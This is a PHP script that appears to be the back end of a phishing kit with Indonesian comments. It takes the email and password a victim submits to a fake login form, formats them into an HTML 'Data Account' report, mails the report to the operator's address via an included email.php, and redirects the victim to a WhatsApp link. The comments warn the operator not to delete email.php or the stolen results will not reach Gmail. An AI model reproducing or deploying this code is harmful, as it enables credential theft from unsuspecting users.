<?php
$email = $_POST['email'];
  $password = $_POST['password'];
  $subject = "= Projek Pelodes Evolution = $email";
  $message = '<pre style="font-size: 1.1em;">
  <table>
    <tr>
      <th colspan="3" align="left">Server : [🩸] </th>
   </tr>
<font size="3">Kita Bisa Meniru Ilmunya Tapi Tidak Dengan Rezkinya</font><br>
<img src="http://lh4.ggpht.com/_5uAQGBjJvAc/TcNddCaczuI/AAAAAAAAAHw/--W8A72wELk/image_thumb%5B5%5D.png?imgmax=800" width="500px" height="200px">
    </table>
     <table>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <th colspan="3" align="left">⇓Data Account⇓</th>
     <tr>
    <th colspan="3" align="left">=================
    </tr>
    <tr>
      <td>Email</td>
      <td>:</td>
      <td>'.$email.'</td>
    </tr>
    <tr>
      <td>Password</td>
      <td>:</td>
      <td>'.$password.'</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <th colspan="3" align="left">=================</th>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr>
    </table>
    <table>
      <font size="4">ATTENTION : Bersedekah Tidak Akan Membuatu Miskin!</font><br>
     </tr>
     <tr>
     <font color="Red">created by : pelodes</font>
   </tr>  
<font color="green">#Jika Ada Kerusakan Di Project Mohon Hubungi Admin</font>
 </tr>
    </table>
    </pre>';
    include 'email.php'; // Jangan Apus Yang email.php Tar Ressnya Ga Bakal Kekirim Ke Gmail!!!
    $headersx  = 'MIME-Version: 1.0' . "\r\n";
    $headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    include'subject.php';
    $datamail = mail($mailto, $subject, $message, $headersx);
    header('location:https://api.whatsapp.com/send?phone=6281289916485&text=&source=&data=&app_absent=  ');
    // Copyright By Pache_Boss22
    // Menerima Request Dan tidak bertanggung jawab atas sesuatu yang merugikan anda atau orang lain